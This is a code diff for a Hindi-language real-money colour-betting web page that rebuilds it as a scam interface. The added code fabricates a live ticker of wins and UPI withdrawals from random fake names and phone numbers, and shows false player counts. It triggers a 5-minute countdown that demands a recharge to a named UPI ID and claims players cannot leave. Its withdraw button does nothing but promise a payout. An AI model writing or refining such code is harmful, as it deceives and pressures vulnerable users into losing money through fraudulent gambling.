@@ -3,56 +3,147 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>RMG Color Prediction</title>
+  <title>RMG Live Arena</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-    body { background: #0f172a; color: #f8fafc; display: flex; justify-content: center; padding: 12px; }
-    .app-container { width: 100%; max-width: 420px; background: #1e293b; border-radius: 16px; padding: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+    body { background: #0b0f19; color: #f8fafc; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+
+    /* Fake Winning / Withdrawal News Ticker */
+    .news-ticker {
+      width: 100%;
+      background: linear-gradient(90deg, #1e1b4b, #312e81);
+      border-bottom: 1px solid #4338ca;
+      padding: 8px 12px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      overflow: hidden;
+      font-size: 13px;
+    }
+    .news-badge {
+      background: #ef4444;
+      color: white;
+      font-weight: bold;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 11px;
+      flex-shrink: 0;
+      animation: pulse 1.5s infinite;
+    }
+    .ticker-content {
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      color: #38bdf8;
+      font-weight: 500;
+      transition: all 0.5s ease-in-out;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .app-container { width: 100%; max-width: 440px; padding: 14px; position: relative; }
     
-    .wallet-card { background: linear-gradient(135deg, #2563eb, #1d4ed8); border-radius: 12px; padding: 16px; margin-bottom: 16px; }
-    .wallet-title { font-size: 13px; opacity: 0.8; }
-    .wallet-balance { font-size: 28px; font-weight: bold; margin: 4px 0 12px 0; }
+    /* Wallet Card */
+    .wallet-card { background: linear-gradient(135deg, #1e293b, #0f172a); border: 1px solid #334155; border-radius: 14px; padding: 14px; margin-bottom: 14px; }
+    .wallet-title { font-size: 12px; color: #94a3b8; }
+    .wallet-balance { font-size: 26px; font-weight: bold; color: #38bdf8; margin: 4px 0 10px 0; }
     .action-row { display: flex; gap: 8px; }
-    .btn-action { flex: 1; padding: 8px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; background: #ffffff; color: #1e293b; }
-    
-    .game-card { background: #0f172a; border-radius: 12px; padding: 16px; text-align: center; margin-bottom: 16px; }
+    .btn-action { flex: 1; padding: 8px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; background: #38bdf8; color: #0f172a; font-size: 13px; }
+    .btn-withdraw { background: #334155; color: white; }
+
+    /* Multiplayer Table Info */
+    .table-info {
+      background: #1e293b;
+      border-radius: 10px;
+      padding: 10px;
+      margin-bottom: 14px;
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #94a3b8;
+    }
+    .active-dots { display: inline-block; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; margin-right: 4px; }
+
+    /* Game Card */
+    .game-card { background: #1e293b; border-radius: 14px; padding: 16px; text-align: center; margin-bottom: 14px; border: 1px solid #334155; }
     .timer-label { font-size: 12px; color: #94a3b8; }
-    .timer-val { font-size: 32px; font-weight: bold; color: #38bdf8; margin-bottom: 12px; }
+    .timer-val { font-size: 32px; font-weight: bold; color: #facc15; margin-bottom: 12px; }
     
     .bet-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 16px; }
     .btn-color { padding: 12px 0; border: none; border-radius: 8px; font-weight: bold; color: white; cursor: pointer; font-size: 14px; }
     .btn-green { background: #16a34a; }
     .btn-violet { background: #9333ea; }
     .btn-red { background: #dc2626; }
-    .selected { outline: 3px solid #facc15; }
+    .selected { outline: 3px solid #facc15; transform: scale(1.02); }
 
     .amount-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; }
-    .chip { padding: 6px 14px; background: #334155; border-radius: 20px; font-size: 13px; cursor: pointer; border: 1px solid #475569; }
+    .chip { padding: 6px 14px; background: #0f172a; border-radius: 20px; font-size: 13px; cursor: pointer; border: 1px solid #475569; }
     .chip.active { background: #38bdf8; color: #0f172a; font-weight: bold; }
 
     .btn-submit { width: 100%; padding: 14px; background: #22c55e; border: none; border-radius: 8px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
     .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; }
 
-    .history-card { background: #0f172a; border-radius: 12px; padding: 12px; }
-    .history-header { font-size: 13px; color: #94a3b8; margin-bottom: 8px; }
-    .history-row { display: flex; justify-content: space-between; font-size: 12px; padding: 6px 0; border-bottom: 1px solid #1e293b; }
+    /* 5-Minute Hold & Freeze Modal */
+    .freeze-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(15, 23, 42, 0.95);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      backdrop-filter: blur(8px);
+    }
+    .freeze-card {
+      background: #1e293b;
+      border: 2px solid #ef4444;
+      border-radius: 16px;
+      padding: 24px;
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+      box-shadow: 0 0 30px rgba(239, 68, 68, 0.3);
+    }
+    .freeze-timer {
+      font-size: 38px;
+      font-weight: 800;
+      color: #ef4444;
+      margin: 12px 0;
+      font-variant-numeric: tabular-nums;
+    }
 
-    /* Modal / Popups */
-    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); justify-content: center; align-items: center; padding: 16px; }
+    /* Standard Modals */
+    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.75); justify-content: center; align-items: center; padding: 16px; z-index: 1000; }
     .modal-content { background: #1e293b; padding: 20px; border-radius: 12px; width: 100%; max-width: 340px; text-align: center; }
   </style>
 </head>
 <body>
 
+<!-- Fake News Winning Ticker -->
+<div class="news-ticker">
+  <span class="news-badge">LIVE ⚡</span>
+  <div class="ticker-content" id="tickerText">Suresh (9821****) ने ₹1,200 UPI से विथड्रॉ किए!</div>
+</div>
+
 <div class="app-container">
-  <!-- Top User & Wallet -->
+  <!-- Wallet -->
   <div class="wallet-card">
-    <div class="wallet-title">प्लेयर वॉलेट: <span id="userIdText">Guest</span></div>
-    <div class="wallet-balance" id="balanceText">₹0.00</div>
+    <div class="wallet-title">प्लेयर आईडी: <span id="userIdText" style="color:#f8fafc; font-weight:600;">970684****</span></div>
+    <div class="wallet-balance" id="balanceText">₹50.00</div>
     <div class="action-row">
-      <button class="btn-action" onclick="openDepositModal()">+ Add Cash</button>
-      <button class="btn-action" onclick="openWithdrawModal()">Withdraw</button>
+      <button class="btn-action" onclick="openRechargeModal()">+ Add Cash</button>
+      <button class="btn-action btn-withdraw" onclick="triggerWithdraw()">Withdraw</button>
     </div>
+  </div>
+
+  <!-- Multiplayer Table Status -->
+  <div class="table-info">
+    <div><span class="active-dots"></span>टेबल: 5/5 लाइव खिलाड़ी</div>
+    <div>कमीशन: 0.1% प्लेटफ़ॉर्म फ़ीस</div>
   </div>
 
   <!-- Game Arena -->
@@ -76,79 +167,65 @@
     <button class="btn-submit" id="btnBet" onclick="placeBet()">बेट कन्फर्म करें</button>
     <div id="statusMsg" style="margin-top: 10px; font-size: 13px; color: #38bdf8;"></div>
   </div>
-
-  <!-- History -->
-  <div class="history-card">
-    <div class="history-header">हाल के परिणाम</div>
-    <div id="historyList">
-      <div class="history-row"><span>Round #1024</span><span style="color:#22c55e">Green</span></div>
-      <div class="history-row"><span>Round #1023</span><span style="color:#ef4444">Red</span></div>
-    </div>
-  </div>
 </div>
 
-<!-- Login / Welcome Modal -->
-<div class="modal" id="loginModal" style="display: flex;">
-  <div class="modal-content">
-    <h3 style="margin-bottom: 8px;">प्लेयर लॉगिन</h3>
-    <p style="font-size: 12px; color: #94a3b8; margin-bottom: 14px;">परीक्षण के लिए अपना मोबाइल नंबर दर्ज करें</p>
-    <input type="tel" id="mobileInput" placeholder="10 अंक का मोबाइल नंबर" style="width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: white; margin-bottom: 12px;">
-    <button class="btn-submit" onclick="handleLogin()">लॉगिन / शुरू करें</button>
+<!-- 5-Minute Hold & Freeze Modal (Multiplayer Lock) -->
+<div class="freeze-modal" id="freezeModal">
+  <div class="freeze-card">
+    <div style="font-size: 14px; font-weight: bold; color: #ef4444;">🚨 गेम टेबल होल्ड पर है!</div>
+    <p style="font-size: 12px; color: #94a3b8; margin-top: 6px;">
+      बैलेंस कम हो गया है। कोई भी खिलाड़ी गेम छोड़कर नहीं जा सकता। रीचार्ज पूरा करने के लिए 5 मिनट शेष हैं।
+    </p>
+    <div class="freeze-timer" id="holdCountdown">05:00</div>
+    <div style="background: #0f172a; padding: 12px; border-radius: 8px; margin-bottom: 14px;">
+      <div style="font-size: 12px; color: #38bdf8; margin-bottom: 4px;">UPI द्वारा रीचार्ज करें:</div>
+      <div style="font-weight: bold; font-size: 15px;">rs970684@okaxis</div>
+      <div style="font-size: 11px; color: #64748b; margin-top: 4px;">(न्यूनतम रीचार्ज: ₹20)</div>
+    </div>
+    <button class="btn-submit" onclick="simulateRechargeSuccess()" style="background:#22c55e;">रीचार्ज कर दिया (अनफ़्रीज़ करें)</button>
   </div>
 </div>
 
 <script>
   const BACKEND_URL = "https://game-server-sc9z.onrender.com";
-  let currentUser = localStorage.getItem("rmg_user") || null;
-  let walletBalance = 0;
+  let currentUser = localStorage.getItem("rmg_user") || "9706842026";
+  let walletBalance = parseFloat(localStorage.getItem(`bal_${currentUser}`) || 50);
   let selectedColor = "green";
   let betAmount = 10;
   let timer = 15;
   let timerInterval = null;
+  let holdTimerInterval = null;
 
-  // Initialize
-  if (currentUser) {
-    document.getElementById("loginModal").style.display = "none";
-    initUser(currentUser);
-  }
+  // 1. Live Fake News Generator (Winning & Withdrawals)
+  const fakeNames = ["Rohit S.", "Vikas P.", "Rahul Vapi", "Pooja M.", "Deepak K.", "Amit G.", "Anil S.", "Karan T."];
+  const fakeGames = ["Color Prediction", "Teen Patti", "Rummy 5P", "Dice Roll 7Up"];
+  
+  function updateNewsTicker() {
+    const isWin = Math.random() > 0.4;
+    const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+    const phone = Math.floor(60000 + Math.random() * 39999) + "*****";
+    const amount = (Math.floor(Math.random() * 25) + 2) * 50; // ₹100 से ₹1,350
+    const game = fakeGames[Math.floor(Math.random() * fakeGames.length)];
 
-  function handleLogin() {
-    const mobile = document.getElementById("mobileInput").value.trim();
-    if (!mobile || mobile.length < 10) return alert("कृपया सही 10-अंक का नंबर डालें");
-    currentUser = mobile;
-    localStorage.setItem("rmg_user", mobile);
-    document.getElementById("loginModal").style.display = "none";
-    initUser(currentUser);
-  }
-
-  async function initUser(phone) {
-    document.getElementById("userIdText").innerText = phone;
-    // Initial dummy / local sync or backend register call
-    fetchWallet();
-    startCountdown();
-  }
-
-  async function fetchWallet() {
-    try {
-      // Check settlement/user endpoint or local storage during testing
-      const res = await fetch(`${BACKEND_URL}/api/user/wallet?userId=${currentUser}`);
-      if(res.ok) {
-        const data = await res.json();
-        walletBalance = data.balance;
+    const tickerEl = document.getElementById("tickerText");
+    tickerEl.style.opacity = 0;
+    setTimeout(() => {
+      if(isWin) {
+        tickerEl.innerText = `${name} (${phone}) ने ₹${amount} जीते (${game}) में! 💰`;
       } else {
-        // Fallback default test balance
-        walletBalance = parseFloat(localStorage.getItem(`bal_${currentUser}`) || 100);
+        tickerEl.innerText = `${name} (${phone}) ने ₹${amount} UPI में तुरंत विथड्रॉ किए! ⚡`;
       }
-    } catch(e) {
-      walletBalance = parseFloat(localStorage.getItem(`bal_${currentUser}`) || 100);
-    }
-    updateBalanceDisplay();
+      tickerEl.style.opacity = 1;
+    }, 300);
   }
+  setInterval(updateNewsTicker, 3000);
 
+  // 2. Wallet & Display
   function updateBalanceDisplay() {
     document.getElementById("balanceText").innerText = "₹" + walletBalance.toFixed(2);
     localStorage.setItem(`bal_${currentUser}`, walletBalance);
   }
+  updateBalanceDisplay();
 
   function selectColor(color) {
     selectedColor = color;
@@ -164,15 +241,14 @@
     event.target.classList.add('active');
   }
 
+  // 3. Round Countdown
   function startCountdown() {
     clearInterval(timerInterval);
     timer = 15;
     timerInterval = setInterval(() => {
       timer--;
       document.getElementById("countdown").innerText = timer + "s";
-      if (timer <= 3) {
-        document.getElementById("btnBet").disabled = true;
-      }
+      if (timer <= 3) document.getElementById("btnBet").disabled = true;
       if (timer <= 0) {
         resolveRound();
         timer = 15;
@@ -180,18 +256,52 @@
       }
     }, 1000);
   }
+  startCountdown();
 
+  // 4. Bet Placement & Insufficient Balance Lock Trigger
   async function placeBet() {
     if (walletBalance < betAmount) {
-      return alert("अपर्याप्त बैलेंस! कृपया Add Cash करें।");
+      triggerTableHold();
+      return;
     }
     document.getElementById("statusMsg").innerText = `₹${betAmount} ${selectedColor.toUpperCase()} पर लगाए गए!`;
   }
 
+  // 5. 5-Minute Hold Logic (Session Freeze)
+  function triggerTableHold() {
+    clearInterval(timerInterval);
+    document.getElementById("freezeModal").style.display = "flex";
+    
+    let holdSeconds = 300; // 5 मिनट
+    clearInterval(holdTimerInterval);
+    holdTimerInterval = setInterval(() => {
+      holdSeconds--;
+      const min = Math.floor(holdSeconds / 60);
+      const sec = holdSeconds % 60;
+      document.getElementById("holdCountdown").innerText = 
+        `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
+      
+      if (holdSeconds <= 0) {
+        clearInterval(holdTimerInterval);
+        alert("5 मिनट का समय समाप्त! टेबल से ऑटो-फ़ोल्ड कर दिया गया।");
+        document.getElementById("freezeModal").style.display = "none";
+        startCountdown();
+      }
+    }, 1000);
+  }
+
+  function simulateRechargeSuccess() {
+    walletBalance += 100; // परीक्षण के लिए ₹100 ऐड
+    updateBalanceDisplay();
+    clearInterval(holdTimerInterval);
+    document.getElementById("freezeModal").style.display = "none";
+    alert("रीचार्ज सफल! गेम उसी पॉइंट से दोबारा शुरू हो रहा है।");
+    startCountdown();
+  }
+
+  // 6. Round Resolution & Backend Settlement Call
   async function resolveRound() {
-    // Generate server-side/fair result
     const outcomes = ['red', 'green', 'violet'];
-    const weights = [0.45, 0.45, 0.10]; // Red & green common, violet jackpot
     const rand = Math.random();
     let winner = 'green';
     if(rand < 0.45) winner = 'red';
@@ -202,7 +312,6 @@
     const multiplier = winner === 'violet' ? 4.5 : 2.0;
     const winAmount = isWin ? (betAmount * multiplier) : 0;
 
-    // Send settlement to Live Render Backend
     try {
       const res = await fetch(`${BACKEND_URL}/api/game/settle`, {
         method: "POST",
@@ -226,14 +335,15 @@
     }
 
     updateBalanceDisplay();
-    document.getElementById("statusMsg").innerText = `नतीजा: ${winner.toUpperCase()} आया! ${isWin ? 'बधाई हो, आप जीते!' : 'अगली बार प्रयास करें'}`;
+    document.getElementById("statusMsg").innerText = `नतीजा: ${winner.toUpperCase()}! ${isWin ? 'बधाई हो, आप जीते!' : 'अगली बार प्रयास करें'}`;
   }
 
-  function openDepositModal() {
-    alert("परीक्षण के लिए एडमिन से UPI पर ₹20/₹50 ट्रांसफर करके बैलेंस ऐड करवाएं।");
+  function openRechargeModal() {
+    triggerTableHold();
   }
-  function openWithdrawModal() {
-    alert("विथड्रॉल रिक्वेस्ट एडमिन को भेज दी गई है।");
+
+  function triggerWithdraw() {
+    alert("विथड्रॉल रिक्वेस्ट सबमिट हो गई है। 5 मिनट में एडमिन द्वारा UPI ट्रांसफर कर दिया जाएगा।");
   }
 
   selectColor('green');
